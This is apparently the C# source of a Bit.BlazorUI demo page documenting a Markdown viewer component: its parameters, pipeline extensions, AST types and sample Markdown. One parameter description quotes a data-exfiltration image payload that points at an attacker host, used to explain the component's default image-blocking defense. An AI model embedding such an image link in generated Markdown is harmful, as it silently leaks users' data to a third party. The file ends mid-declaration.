namespace Bit.BlazorUI.Demo.Client.Core.Pages.Components.Extras.MarkdownViewer;

public partial class BitMarkdownViewerDemo
{
    private enum MarkdownFlavor { Basic, GitHub, Advanced }

    private readonly List<ComponentParameter> componentParameters =
    [
        new()
        {
           Name = "Markdown",
           Type = "string?",
           DefaultValue = "null",
           Description = "The Markdown string value to render as html elements.",
        },
        new()
        {
           Name = "Pipeline",
           Type = "BitMarkdownPipeline?",
           DefaultValue = "null",
           Description = @"The processing pipeline (flavor set). Defaults to the basic CommonMark core with no extensions.
                           Use one of the ready-made pipelines on BitMarkdownPipelines (Basic, GitHub, Advanced)
                           or build a custom one with BitMarkdownPipelineBuilder.",
           LinkType = LinkType.Link,
           Href = "#markdown-viewer-pipeline",
        },
        new()
        {
           Name = "ImageRendering",
           Type = "BitMarkdownViewerImageRendering",
           DefaultValue = "BitMarkdownViewerImageRendering.SameOrigin",
           Description = @"Controls whether remote images are allowed to load, guarding against silent data-exfiltration
                           via auto-fetched image URLs (for example ![x](https://attacker.com/leak?data=SECRET)).
                           Defaults to the safe SameOrigin policy; set it to All to load every remote image when the
                           source is fully trusted, or None for the strictest policy.",
           LinkType = LinkType.Link,
           Href = "#markdown-viewer-image-rendering-enum",
        },
        new()
        {
           Name = "Inline",
           Type = "bool",
           DefaultValue = "false",
           Description = @"Renders the document as inline content: the root element becomes a span and each top-level
                           paragraph contributes its inline content directly, without the <p> that would otherwise force
                           a line of its own. Use it where a short piece of Markdown has to sit inside a sentence, a
                           table cell or a label. Blocks that are not paragraphs (lists, tables, headings) still render
                           as themselves.",
        },
        new()
        {
           Name = "MaxNestingDepth",
           Type = "int",
           DefaultValue = "100",
           Description = @"The maximum block/inline nesting depth allowed while parsing. Content nested deeper than this is rendered
                           as plain text instead of being parsed further. An always-on safeguard against denial-of-service via
                           pathologically nested input (e.g. thousands of nested blockquotes) that would otherwise overflow the
                           stack. Values <= 0 fall back to the default. Legitimate documents never approach this limit.",
        },
        new()
        {
           Name = "MaxLength",
           Type = "int",
           DefaultValue = "0",
           Description = @"When greater than zero, the Markdown source is truncated to this many characters before parsing,
                           bounding the work done on untrusted input. The cut never splits a surrogate pair.
                           Defaults to 0 (no limit).",
        },
        new()
        {
           Name = "OnParsed",
           Type = "EventCallback<BitMarkdownDocumentNode>",
           DefaultValue = "",
           Description = @"Called after the Markdown source has been parsed, with the document that is about to be rendered.
                           The tree is the same one the renderer walks, so a handler can read it - to build a table of contents
                           from the headings, for example - or rewrite it before it reaches the DOM.",
           LinkType = LinkType.Link,
           Href = "#markdown-viewer-document-node",
        },
        new()
        {
           Name = "CodeBlockTemplate",
           Type = "RenderFragment<BitMarkdownCodeBlockNode>?",
           DefaultValue = "null",
           Description = @"Renders every fenced or indented code block, instead of the <pre><code> the viewer would otherwise
                           draw. This is where a syntax highlighter, a copy button or a diagram renderer goes: the template
                           is given the block, so it can read the language off Info and the source off Content.",
        },
        new()
        {
           Name = "ImageTemplate",
           Type = "RenderFragment<BitMarkdownImageNode>?",
           DefaultValue = "null",
           Description = @"Renders every image, instead of the <img> the viewer would otherwise draw - for a lightbox, a
                           placeholder while it loads, or a component that serves a modern format. The ImageRendering
                           policy has already been applied, so a blocked image reaches the template with an empty Url.",
        },
        new()
        {
           Name = "LinkTemplate",
           Type = "RenderFragment<BitMarkdownLinkNode>?",
           DefaultValue = "null",
           Description = @"Renders every link, instead of the <a> the viewer would otherwise draw - to route an in-app
                           destination through the router, or to decorate an external one. The destination has already been
                           sanitized. A link's own content is not rendered for you; read
                           BitMarkdownInlineHelpers.PlainText(context.Children) for its text.",
        },
        new()
        {
           Name = "OnTaskChanged",
           Type = "EventCallback<BitMarkdownViewerTaskChangedEventArgs>",
           DefaultValue = "",
           Description = @"Called when a reader ticks or unticks a task-list checkbox, with the source rewritten to match.
                           Setting it is what makes the checkboxes interactive at all: with no handler they stay the
                           read-only boxes GitHub renders. The viewer does not change Markdown itself - it hands you the
                           new source and leaves storing it to you. Requires the task-list flavor.",
           LinkType = LinkType.Link,
           Href = "#markdown-viewer-task-changed-args",
        },
        new()
        {
           Name = "StripBidiControlCharacters",
           Type = "bool",
           DefaultValue = "false",
           Description = @"When true, Unicode bidirectional control characters are stripped from the source before parsing,
                           neutralizing 'Trojan Source' (CVE-2021-42574) spoofing where text is made to display in a different
                           order than it is encoded. Recommended for untrusted or AI-generated Markdown. Zero-width joiners used
                           by emoji and complex scripts are never removed.",
        },
    ];

    private readonly List<ComponentParameter> componentPublicMembers =
    [
        new()
        {
            Name = "Document",
            Type = "BitMarkdownDocumentNode",
            DefaultValue = "",
            Description = @"The most recently parsed document. Useful for reading structure out of the source
                            (headings, links, images) without parsing it a second time.",
            LinkType = LinkType.Link,
            Href = "#markdown-viewer-document-node",
        },
    ];

    private readonly List<ComponentSubClass> componentSubClasses =
    [
        new()
        {
            Id = "markdown-viewer-pipelines",
            Title = "BitMarkdownPipelines",
            Description = "The ready-made, cached pipelines. Each is built once and shared, so passing one costs nothing per render.",
            Parameters =
            [
                new()
                {
                    Name = "Basic",
                    Type = "static BitMarkdownPipeline",
                    DefaultValue = "",
                    Description = "The basic CommonMark core only: headings, emphasis, links, images, lists, block quotes, code, link reference definitions and character references.",
                },
                new()
                {
                    Name = "GitHub",
                    Type = "static BitMarkdownPipeline",
                    DefaultValue = "",
                    Description = "The GitHub flavors: pipe tables, strikethrough, task lists, autolink literals, footnotes and alerts, on top of the core.",
                },
                new()
                {
                    Name = "Advanced",
                    Type = "static BitMarkdownPipeline",
                    DefaultValue = "",
                    Description = "The GitHub flavors plus front matter, the emphasis extras, containers, definition lists, abbreviations, figures, :shortcode: emoji and automatic heading ids.",
                },
            ]
        },
        new()
        {
            Id = "markdown-viewer-pipeline-builder",
            Title = "BitMarkdownPipelineBuilder",
            Description = "Composes a pipeline from the flavors you want. A freshly created builder holds only the CommonMark core; each Use... call adds one extension, and Build() produces the immutable pipeline. The same extension is only applied once.",
            Parameters =
            [
                new()
                {
                    Name = "UsePipeTables",
                    Type = "BitMarkdownPipelineBuilder UsePipeTables()",
                    DefaultValue = "",
                    Description = "Adds GitHub-style pipe tables with per-column alignment.",
                },
                new()
                {
                    Name = "UseStrikethrough",
                    Type = "BitMarkdownPipelineBuilder UseStrikethrough()",
                    DefaultValue = "",
                    Description = "Adds ~~strikethrough~~.",
                },
                new()
                {
                    Name = "UseTaskLists",
                    Type = "BitMarkdownPipelineBuilder UseTaskLists()",
                    DefaultValue = "",
                    Description = "Adds GitHub task lists (- [ ] / - [x]).",
                },
                new()
                {
                    Name = "UseAutoLinks",
                    Type = "BitMarkdownPipelineBuilder UseAutoLinks()",
                    DefaultValue = "",
                    Description = "Adds autolink literals, so bare URLs and email addresses become links.",
                },
                new()
                {
                    Name = "UseEmojis",
                    Type = "BitMarkdownPipelineBuilder UseEmojis()",
                    DefaultValue = "",
                    Description = "Adds :shortcode: emoji replacement, using the built-in map.",
                },
                new()
                {
                    Name = "UseEmojis",
                    Type = "BitMarkdownPipelineBuilder UseEmojis(IReadOnlyDictionary<string, string> overrides)",
                    DefaultValue = "",
                    Description = "Adds :shortcode: emoji replacement, extending the built-in map with per-pipeline overrides. An override replaces the built-in shortcode of the same name.",
                },
                new()
                {
                    Name = "UseAutoIdentifiers",
                    Type = "BitMarkdownPipelineBuilder UseAutoIdentifiers()",
                    DefaultValue = "",
                    Description = "Gives every heading a unique, URL-friendly id slug so it can be deep-linked.",
                },
                new()
                {
                    Name = "UseEmphasisExtras",
                    Type = "BitMarkdownPipelineBuilder UseEmphasisExtras()",
                    DefaultValue = "",
                    Description = "Adds the emphasis flavors beyond * , _ and ~~ : ~subscript~, ^superscript^, ++inserted++ and ==highlighted==, rendered as <sub>, <sup>, <ins> and <mark>. Implies strikethrough, because subscript shares the ~ character with it.",
                },
                new()
                {
                    Name = "UseContainers",
                    Type = "BitMarkdownPipelineBuilder UseContainers()",
                    DefaultValue = "",
                    Description = "Adds custom containers: ':::name optional title' ... ':::' renders as a div classed after the name, which is how documentation sites write admonitions and layout blocks. Containers nest, and the name 'details' renders a real <details> with the title as its <summary>.",
                },
                new()
                {
                    Name = "UseDefinitionLists",
                    Type = "BitMarkdownPipelineBuilder UseDefinitionLists()",
                    DefaultValue = "",
                    Description = "Adds definition lists: a term on its own line followed by ': its definition' renders as a real <dl> of <dt> and <dd>.",
                },
                new()
                {
                    Name = "UseAbbreviations",
                    Type = "BitMarkdownPipelineBuilder UseAbbreviations()",
                    DefaultValue = "",
                    Description = "Adds abbreviations: '*[HTML]: HyperText Markup Language' declares a term once and every whole-word occurrence of it becomes an <abbr> carrying the expansion.",
                },
                new()
                {
                    Name = "UseMathematics",
                    Type = "BitMarkdownPipelineBuilder UseMathematics()",
                    DefaultValue = "",
                    Description = "Adds mathematics: $inline$ and $$display$$ are kept verbatim - safe from Markdown's own emphasis and escape rules - and marked as span.math-inline / div.math-display for a client-side typesetter such as KaTeX or MathJax.",
                },
                new()
                {
                    Name = "UseFigures",
                    Type = "BitMarkdownPipelineBuilder UseFigures()",
                    DefaultValue = "",
                    Description = "Adds figures: an image alone in a paragraph and written with a title renders as a <figure> with that title as its <figcaption>.",
                },
                new()
                {
                    Name = "UseFrontMatter",
                    Type = "BitMarkdownPipelineBuilder UseFrontMatter()",
                    DefaultValue = "",
                    Description = "Adds YAML (---) and TOML (+++) front matter, so a metadata block at the top of the document is parsed into a BitMarkdownFrontMatterNode that renders nothing instead of showing up as a thematic break and a heading.",
                    LinkType = LinkType.Link,
                    Href = "#markdown-viewer-front-matter-node",
                },
                new()
                {
                    Name = "UseSmartyPants",
                    Type = "BitMarkdownPipelineBuilder UseSmartyPants()",
                    DefaultValue = "",
                    Description = "Adds typographic replacement: curly quotes, en and em dashes, ellipses and guillemets. Code spans, code blocks and URLs keep every character as written.",
                },
                new()
                {
                    Name = "UseAutoIdentifiers",
                    Type = "BitMarkdownPipelineBuilder UseAutoIdentifiers(bool anchorLinks)",
                    DefaultValue = "",
                    Description = "Gives every heading a unique, URL-friendly id slug so it can be deep-linked, and - when anchorLinks is true - appends a permalink to each heading. A heading may also name its own id by ending with {#the-id}, which is removed from the rendered text.",
                },
                new()
                {
                    Name = "UseFootnotes",
                    Type = "BitMarkdownPipelineBuilder UseFootnotes()",
                    DefaultValue = "",
                    Description = "Adds GitHub-style footnotes: a [^label] reference plus a [^label]: definition. Included in the GitHub bundle, because a footnote definition is also a valid link reference definition.",
                },
                new()
                {
                    Name = "UseAlerts",
                    Type = "BitMarkdownPipelineBuilder UseAlerts()",
                    DefaultValue = "",
                    Description = "Adds GitHub alerts: > [!NOTE], > [!TIP], > [!IMPORTANT], > [!WARNING] and > [!CAUTION] block quotes render as titled callouts.",
                },
                new()
                {
                    Name = "UseTexts",
                    Type = "BitMarkdownPipelineBuilder UseTexts(BitMarkdownTexts texts)",
                    DefaultValue = "",
                    Description = "Sets the words the renderers write themselves - alert titles, footnote back-links, the accessible names of the regions and controls the markup adds - so a rendered document can be in a language other than English.",
                    LinkType = LinkType.Link,
                    Href = "#markdown-viewer-texts",
                },
                new()
                {
                    Name = "UseUrlRewriter",
                    Type = "BitMarkdownPipelineBuilder UseUrlRewriter(Func<BitMarkdownUrlRewriteContext, string?> rewrite)",
                    DefaultValue = "",
                    Description = "Rewrites every link and image destination through a function of your own. The result is sanitized again on the way out, so a rewriter can never reintroduce an unsafe destination; returning null drops the destination and keeps the text.",
                    LinkType = LinkType.Link,
                    Href = "#markdown-viewer-url-rewrite-context",
                },
                new()
                {
                    Name = "UseBaseUrl",
                    Type = "BitMarkdownPipelineBuilder UseBaseUrl(string baseUrl)",
                    DefaultValue = "",
                    Description = "Resolves every relative link and image destination against baseUrl - what a README needs before it can be rendered anywhere but the repository it came from. Absolute destinations and in-page fragments are left alone.",
                },
                new()
                {
                    Name = "UseLinkOptions",
                    Type = "BitMarkdownPipelineBuilder UseLinkOptions(BitMarkdownLinkTarget externalTarget, string? externalRel, BitMarkdownLinkTarget internalTarget, string? internalRel)",
                    DefaultValue = "",
                    Description = "Chooses the target and rel a rendered link carries, replacing the defaults (external links open in a new tab with 'noopener noreferrer'). Pass 'noopener noreferrer nofollow ugc' for links a site's own readers wrote.",
                    LinkType = LinkType.Link,
                    Href = "#markdown-viewer-link-target-enum",
                },
                new()
                {
                    Name = "UseSoftLineAsHardLine",
                    Type = "BitMarkdownPipelineBuilder UseSoftLineAsHardLine()",
                    DefaultValue = "",
                    Description = "Renders every single newline as a line break, the way a chat or comment box does.",
                },
                new()
                {
                    Name = "UseGitHubFlavored",
                    Type = "BitMarkdownPipelineBuilder UseGitHubFlavored()",
                    DefaultValue = "",
                    Description = "Adds the full GitHub bundle: pipe tables, strikethrough, task lists, autolinks, footnotes and alerts.",
                },
                new()
                {
                    Name = "UseAdvanced",
                    Type = "BitMarkdownPipelineBuilder UseAdvanced()",
                    DefaultValue = "",
                    Description = "Adds the GitHub flavors plus front matter, the emphasis extras, containers, definition lists, abbreviations, figures, emoji and auto-identifiers.",
                },
                new()
                {
                    Name = "Use",
                    Type = "BitMarkdownPipelineBuilder Use(IBitMarkdownExtension extension)",
                    DefaultValue = "",
                    Description = "Adds a custom extension. An extension registers block parsers, inline parsers, delimiter processors, AST processors and/or renderers; everything it registers must be stateless, since a built pipeline is shared across concurrent parses.",
                },
                new()
                {
                    Name = "Build",
                    Type = "BitMarkdownPipeline Build()",
                    DefaultValue = "",
                    Description = "Builds the immutable, reusable pipeline.",
                    LinkType = LinkType.Link,
                    Href = "#markdown-viewer-pipeline",
                },
            ]
        },
        new()
        {
            Id = "markdown-viewer-pipeline",
            Title = "BitMarkdownPipeline",
            Description = "An immutable, reusable Markdown processing configuration produced by a BitMarkdownPipelineBuilder. Pipelines are thread-safe and should be cached and shared rather than rebuilt per render.",
            Parameters =
            [
                new()
                {
                    Name = "Parse",
                    Type = "BitMarkdownDocumentNode Parse(string? markdown)",
                    DefaultValue = "",
                    Description = "Parses Markdown source into an AST, applying all AST processors.",
                    LinkType = LinkType.Link,
                    Href = "#markdown-viewer-document-node",
                },
                new()
                {
                    Name = "CreateRenderer",
                    Type = "BitMarkdownRenderer CreateRenderer()",
                    DefaultValue = "",
                    Description = "Creates a renderer bound to this pipeline's node renderers.",
                    LinkType = LinkType.Link,
                    Href = "#markdown-viewer-renderer",
                },
            ]
        },
        new()
        {
            Id = "markdown-viewer-document-node",
            Title = "BitMarkdownDocumentNode",
            Description = "The root of a parsed Markdown document. Inherits from BitMarkdownNode.",
            Parameters =
            [
                new()
                {
                    Name = "Children",
                    Type = "List<BitMarkdownNode>",
                    DefaultValue = "[]",
                    Description = "The top-level child nodes of the document.",
                    LinkType = LinkType.Link,
                    Href = "#markdown-viewer-node",
                },
                new()
                {
                    Name = "ChildNodes",
                    Type = "IList<BitMarkdownNode>",
                    DefaultValue = "",
                    Description = "The node's single child collection (returns Children).",
                    LinkType = LinkType.Link,
                    Href = "#markdown-viewer-node",
                },
            ]
        },
        new()
        {
            Id = "markdown-viewer-node",
            Title = "BitMarkdownNode",
            Description = "The abstract base type for every node produced by the parser. Nodes expose their mutable child collections so that AST processors (plugins) can traverse and rewrite the tree generically, even for node types they did not define. BitMarkdownAstHelper.Descendants(node) walks the whole tree iteratively, so even pathologically nested documents cannot overflow the stack.",
            Parameters =
            [
                new()
                {
                    Name = "ChildNodes",
                    Type = "virtual IList<BitMarkdownNode>?",
                    DefaultValue = "null",
                    Description = "The node's single child collection, if it has exactly one. Container nodes override this; leaf nodes return null.",
                },
                new()
                {
                    Name = "ChildLists",
                    Type = "virtual IEnumerable<IList<BitMarkdownNode>>",
                    DefaultValue = "",
                    Description = "All mutable child collections owned by this node. Defaults to the single ChildNodes collection; nodes with several (e.g. a table's cells) override this to expose each one.",
                },
            ]
        },
        new()
        {
            Id = "markdown-viewer-front-matter-node",
            Title = "BitMarkdownFrontMatterNode",
            Description = "The metadata block a document may open with, fenced by --- (YAML) or +++ (TOML). It describes the file rather than belonging to it, so it renders nothing and is read back off the AST. Requires the front matter flavor; without it a leading --- is ordinary Markdown.",
            Parameters =
            [
                new()
                {
                    Name = "Fence",
                    Type = "string",
                    DefaultValue = "---",
                    Description = "The fence that opened the block, either --- or +++.",
                },
                new()
                {
                    Name = "Text",
                    Type = "string",
                    DefaultValue = "",
                    Description = "The raw text between the fences, with the line endings normalized to \n. Hand it to whichever serializer you already use.",
                },
                new()
                {
                    Name = "IsToml",
                    Type = "bool",
                    DefaultValue = "false",
                    Description = "True when the block was fenced with +++, i.e. TOML rather than YAML.",
                },
                new()
                {
                    Name = "Find",
                    Type = "static BitMarkdownFrontMatterNode? Find(BitMarkdownDocumentNode document)",
                    DefaultValue = "",
                    Description = "Returns the document's front matter block, or null when it has none.",
                },
            ]
        },
        new()
        {
            Id = "markdown-viewer-task-changed-args",
            Title = "BitMarkdownViewerTaskChangedEventArgs",
            Description = "What the viewer reports when a reader ticks or unticks a task-list checkbox.",
            Parameters =
            [
                new()
                {
                    Name = "Index",
                    Type = "int",
                    DefaultValue = "0",
                    Description = "The checkbox's position in the document, counted from 0 in reading order.",
                },
                new()
                {
                    Name = "Checked",
                    Type = "bool",
                    DefaultValue = "false",
                    Description = "Its new state.",
                },
                new()
                {
                    Name = "Markdown",
                    Type = "string",
                    DefaultValue = "",
                    Description = "The source with that one marker rewritten, ready to be stored. Produced by BitMarkdownTaskList.Toggle, which counts the same markers the viewer drew and skips any inside code blocks.",
                },
            ]
        },
        new()
        {
            Id = "markdown-viewer-url-rewrite-context",
            Title = "BitMarkdownUrlRewriteContext",
            Description = "What a URL rewriter is told about the destination it is being asked to rewrite.",
            Parameters =
            [
                new()
                {
                    Name = "Url",
                    Type = "string",
                    DefaultValue = "",
                    Description = "The sanitized destination, exactly as it would otherwise be rendered.",
                },
                new()
                {
                    Name = "IsImage",
                    Type = "bool",
                    DefaultValue = "false",
                    Description = "True for an image source, false for a link destination.",
                },
                new()
                {
                    Name = "IsRelative",
                    Type = "bool",
                    DefaultValue = "false",
                    Description = "True when the URL has no scheme and does not begin with '//'. An in-page fragment (#section) is not relative in this sense, since resolving it elsewhere would break every heading link in the document.",
                },
            ]
        },
        new()
        {
            Id = "markdown-viewer-texts",
            Title = "BitMarkdownTexts",
            Description = "The words the renderers write into a document themselves, rather than taking them from the source. All strings default to English. The numbered ones take their number through {0}; FootnoteBackReferenceOccurrence takes the footnote's number and the citation's through {0} and {1}.",
            Parameters =
            [
                new() { Name = "AlertNote", Type = "string", DefaultValue = "Note", Description = "The title of a > [!NOTE] alert." },
                new() { Name = "AlertTip", Type = "string", DefaultValue = "Tip", Description = "The title of a > [!TIP] alert." },
                new() { Name = "AlertImportant", Type = "string", DefaultValue = "Important", Description = "The title of a > [!IMPORTANT] alert." },
                new() { Name = "AlertWarning", Type = "string", DefaultValue = "Warning", Description = "The title of a > [!WARNING] alert." },
                new() { Name = "AlertCaution", Type = "string", DefaultValue = "Caution", Description = "The title of a > [!CAUTION] alert." },
                new() { Name = "Footnotes", Type = "string", DefaultValue = "Footnotes", Description = "The accessible name of the footnotes section." },
                new() { Name = "FootnoteBackReference", Type = "string", DefaultValue = "Back to reference {0}", Description = "The accessible name of a footnote's back-link, given the footnote's number." },
                new() { Name = "FootnoteBackReferenceOccurrence", Type = "string", DefaultValue = "Back to reference {0}-{1}", Description = "The accessible name of one of several back-links on the same footnote, given the footnote's number and the citation's." },
                new() { Name = "Table", Type = "string", DefaultValue = "Table", Description = "The accessible name of the scrollable region a table sits in." },
                new() { Name = "PermalinkTo", Type = "string", DefaultValue = "Permalink to {0}", Description = "The accessible name of a heading's permalink, given the heading's text." },
                new() { Name = "PermalinkToSection", Type = "string", DefaultValue = "Permalink to this section", Description = "The accessible name of a permalink whose heading has no text of its own." },
                new() { Name = "Task", Type = "string", DefaultValue = "Task {0}", Description = "The accessible name of an interactive task-list checkbox, given its number." },
            ]
        },
        new()
        {
            Id = "markdown-viewer-ast-helper",
            Title = "BitMarkdownAstHelper",
            Description = "Helpers for reading and rewriting a parsed document. Every walk here is iterative, so even a pathologically nested document cannot overflow the stack.",
            Parameters =
            [
                new()
                {
                    Name = "Descendants",
                    Type = "static IEnumerable<BitMarkdownNode> Descendants(BitMarkdownNode node)",
                    DefaultValue = "",
                    Description = "Enumerates every node in the tree, in document order, excluding the root.",
                },
                new()
                {
                    Name = "VisitChildLists",
                    Type = "static void VisitChildLists(BitMarkdownNode node, Action<IList<BitMarkdownNode>> action)",
                    DefaultValue = "",
                    Description = "Invokes the action for every child collection in the tree, depth-first. The action may add, remove or replace entries in place, which is how an AST processor rewrites the tree.",
                },
                new()
                {
                    Name = "ToPlainText",
                    Type = "static string ToPlainText(BitMarkdownNode node)",
                    DefaultValue = "",
                    Description = "Renders the subtree as plain text: what the document says, with none of the markup it says it with and none of the link destinations. Blocks are separated by a blank line. This is the text a search index, an excerpt or a meta description is built from.",
                },
            ]
        },
        new()
        {
            Id = "markdown-viewer-renderer",
            Title = "BitMarkdownRenderer",
            Description = "Walks an AST and dispatches each node to a matching node renderer. Renderers are probed in reverse registration order, so the last renderer registered for a node type wins, allowing pipeline extensions to override the core renderers.",
            Parameters =
            [
                new()
                {
                    Name = "WriteNodes",
                    Type = "void WriteNodes(RenderTreeBuilder builder, IEnumerable<BitMarkdownNode> nodes)",
                    DefaultValue = "",
                    Description = "Renders a sequence of nodes.",
                },
                new()
                {
                    Name = "WriteNode",
                    Type = "void WriteNode(RenderTreeBuilder builder, BitMarkdownNode node)",
                    DefaultValue = "",
                    Description = "Renders a single node using the matching renderer (last registered wins).",
                },
            ]
        },
    ];

    private readonly List<ComponentSubEnum> componentSubEnums =
    [
        new()
        {
            Id = "markdown-viewer-image-rendering-enum",
            Name = "BitMarkdownViewerImageRendering",
            Description = "Controls how the BitMarkdownViewer handles image sources, primarily as a defense against data-exfiltration attacks. A remote image is fetched automatically by the browser the moment it is rendered, silently leaking whatever an attacker encodes into the URL.",
            Items =
            [
                new()
                {
                    Name = "All",
                    Description = "All images are rendered and loaded automatically, including remote ones. Suitable only when the Markdown source is fully trusted.",
                    Value = "0",
                },
                new()
                {
                    Name = "SameOrigin",
                    Description = "Only same-origin images (relative paths, anchors, same-document references and embedded data: images) are loaded. Cross-origin images (http:, https: and protocol-relative //) are blocked. The recommended mode for untrusted or AI-generated Markdown.",
                    Value = "1",
                },
                new()
                {
                    Name = "None",
                    Description = "No image is allowed to load; every image source is stripped and only the alt text remains. The strictest option.",
                    Value = "2",
                },
            ]
        },
        new()
        {
            Id = "markdown-viewer-link-target-enum",
            Name = "BitMarkdownLinkTarget",
            Description = "Where a link opens, i.e. the target attribute it is rendered with.",
            Items =
            [
                new() { Name = "Self", Description = "No target at all: the link opens in the same browsing context.", Value = "0" },
                new() { Name = "Blank", Description = "Opens in a new tab or window (_blank).", Value = "1" },
                new() { Name = "Parent", Description = "Opens in the parent browsing context (_parent).", Value = "2" },
                new() { Name = "Top", Description = "Opens in the topmost browsing context (_top).", Value = "3" },
            ]
        },
        new()
        {
            Id = "markdown-viewer-alert-kind-enum",
            Name = "BitMarkdownAlertKind",
            Description = "The five GitHub alert kinds a > [!...] block quote can carry, in the order GitHub documents them.",
            Items =
            [
                new() { Name = "Note", Description = "Useful information the reader should notice even when skimming.", Value = "0" },
                new() { Name = "Tip", Description = "Optional advice for doing something better.", Value = "1" },
                new() { Name = "Important", Description = "Key information the reader needs to succeed.", Value = "2" },
                new() { Name = "Warning", Description = "Urgent information that needs immediate attention to avoid a problem.", Value = "3" },
                new() { Name = "Caution", Description = "Advice about the risks or negative outcomes of an action.", Value = "4" },
            ]
        },
    ];



    // -- GitHub flavored example ---------------------------------------------

    private readonly string gitHubMarkdown = @"# GitHub Flavored Markdown

Supports ~~strikethrough~~ and bare links like https://bitplatform.dev

## Task list

- [x] Parse Markdown in pure C#
- [x] Render the real render tree
- [ ] Use any JavaScript

## Table

| Feature       | Basic | GitHub |
|:--------------|:-----:|:------:|
| Headings      |   ✔   |   ✔    |
| Tables        |       |   ✔    |
| Strikethrough |       |   ✔    |
";



    // -- Alerts example ------------------------------------------------------

    private readonly string alertsMarkdown = @"> [!NOTE]
> Useful information that users should know, even when skimming content.

> [!TIP]
> Helpful advice for doing things better or more easily.

> [!IMPORTANT]
> Key information users need to know to achieve their goal.

> [!WARNING]
> Urgent info that needs immediate user attention to avoid problems.

> [!CAUTION]
> Advises about risks or negative outcomes of certain actions.

> A block quote without a marker is still an ordinary block quote.
";



    // -- Footnotes example ---------------------------------------------------

    private readonly string footnotesMarkdown = @"The parser walks the source once[^once] and hands the renderer an AST[^ast],
which is why the same note can be cited twice[^once].

[^once]: One pass over the lines, then one pass over the inline text of each block.
[^ast]: An abstract syntax tree - the tree of headings, paragraphs and inline runs
    that the render tree is built from.
";



    // -- References & entities example ---------------------------------------

    private readonly string referencesMarkdown = @"# Reference links

The [bit platform][bit] site, the [Blazor docs][docs], and the same
[bit] link again as a shortcut reference.

Character references are decoded too: &copy; 2026 &mdash; &#169; is the same
sign written as a number, and &#x2705; as hex. Inside code they stay literal:
`&copy;`.

[bit]: https://bitplatform.dev ""bit platform""
[docs]: https://learn.microsoft.com/aspnet/core/blazor ""ASP.NET Core Blazor""
";



    // -- Emphasis extras example ---------------------------------------------

    private readonly BitMarkdownPipeline emphasisExtrasPipeline = new BitMarkdownPipelineBuilder()
        .UseEmphasisExtras()
        .Build();

    private readonly string emphasisExtrasMarkdown = @"Water is H~2~O, the area of a circle is πr^2^, and 2^10^ = 1024.

This release ++adds streaming++ and ~~drops the old overload~~, so ==read the migration notes== first.

Ordinary prose is left alone: 1 + 2 = 3, and a+b is not inserted text.
";



    // -- Typography example --------------------------------------------------

    private readonly BitMarkdownPipeline smartyPantsPipeline = new BitMarkdownPipelineBuilder()
        .UseSmartyPants()
        .Build();

    private readonly string typographyMarkdown = @"""Typography matters,"" she said -- and it's hard to disagree...

The 2024--2026 range uses an en dash; an aside uses an em dash --- like this one.

Code keeps every character: `--- ""not curled"" ...`
";



    // -- Front matter example ------------------------------------------------

    private readonly BitMarkdownPipeline frontMatterPipeline = new BitMarkdownPipelineBuilder()
        .UseFrontMatter()
        .Build();

    private string frontMatterText = string.Empty;

    private void HandleFrontMatterParsed(BitMarkdownDocumentNode document)
    {
        var frontMatter = BitMarkdownFrontMatterNode.Find(document);
        frontMatterText = frontMatter is null ? "(none)" : frontMatter.Text.ReplaceLineEndings(" | ");
    }

    private readonly string frontMatterMarkdown = @"---
title: Release notes
date: 2026-09-09
tags: [blazor, markdown]
---

# Release notes

The metadata above describes the file; it is not part of the document.
";



    // -- Containers example --------------------------------------------------

    private readonly BitMarkdownPipeline containersPipeline = new BitMarkdownPipelineBuilder()
        .UseContainers()
        .Build();

    private readonly string containersMarkdown = @":::tip Start here
Containers are fenced with three colons. The first word names the container.
:::

:::warning Read this first
The rest of the line is the title, and the body is **ordinary Markdown**.

:::note
Containers nest, so an aside can sit inside one.
:::

:::

:::details How the fence is read
The word after the fence names the container; the rest of the line is its title.

This one is a real `<details>`, so it opens and closes.
:::

:::glossary
A name the stylesheet has no opinion about is a plain block you style yourself.
:::
";



    // -- Definition list example ---------------------------------------------

    private readonly BitMarkdownPipeline definitionListPipeline = new BitMarkdownPipelineBuilder()
        .UseDefinitionLists()
        .Build();

    private readonly string definitionListMarkdown = @"Pipeline
: The immutable set of flavors a document is parsed with.
: Build it once and share it.

AST
: The tree of headings, paragraphs and inline runs the parser produces.

    A definition indented under its own text may run to several paragraphs,
    or hold a list:

    - one
    - two
";



    // -- Abbreviations example -----------------------------------------------

    private readonly BitMarkdownPipeline abbreviationPipeline = new BitMarkdownPipelineBuilder()
        .UseAbbreviations()
        .Build();

    private readonly string abbreviationMarkdown = @"*[HTML]: HyperText Markup Language
*[AST]: Abstract Syntax Tree
*[CSP]: Content Security Policy

The parser builds an AST and the renderer writes HTML from it, which is what keeps
the output usable under a strict CSP.

Only whole words are expanded, so HTMLElement keeps its own name and `HTML` inside
code stays literal.
";



    // -- Mathematics example -------------------------------------------------

    private readonly BitMarkdownPipeline mathPipeline = new BitMarkdownPipelineBuilder()
        .UseMathematics()
        .Build();

    private readonly string mathMarkdown = @"Euler's identity, $e^{i\pi} + 1 = 0$, in one line.

$$
\int_0^1 x^2 \, dx = \frac{1}{3}
$$

Without a typesetter on the page the TeX reads as itself. Prices are left alone:
this costs $5 and that one $10.
";



    // -- Figures example -----------------------------------------------------

    private readonly BitMarkdownPipeline figurePipeline = new BitMarkdownPipelineBuilder()
        .UseFigures()
        .Build();

    private readonly string figureMarkdown = @"![The bit platform logo](/_content/Bit.BlazorUI.Demo.Client.Core/images/bit-logo-blue.png ""The logo, as a captioned figure"")

An image with no title stays an ordinary image:

![The bit platform logo](/_content/Bit.BlazorUI.Demo.Client.Core/images/bit-logo-blue.png)
";



    // -- Line breaks example -------------------------------------------------

    private readonly BitMarkdownPipeline softBreakPipeline = new BitMarkdownPipelineBuilder()
        .UseSoftLineAsHardLine()
        .Build();

    private readonly string lineBreaksMarkdown = @"Roses are red
Violets are blue
Markdown reflows
Unless you tell it not to";



    // -- Custom pipeline example ---------------------------------------------

    private readonly BitMarkdownPipeline customPipeline = new BitMarkdownPipelineBuilder()
        .UsePipeTables()
        .UseStrikethrough()
        .UseTaskLists()
        .UseEmojis()
        .UseAutoIdentifiers()
        .Build();

    private readonly string customMarkdown = @"# Custom pipeline :sparkles:

This viewer uses a pipeline composed with only the extensions we picked:
pipe tables, strikethrough, task lists, emoji and auto identifiers.
Autolinks were left out, so https://bitplatform.dev stays plain text.

- [x] ~~Old~~ approach replaced
- [ ] Anything left to do?
";



    // -- Untrusted content example -------------------------------------------

    private static readonly BitMarkdownViewerImageRendering[] imageRenderingModes =
    [
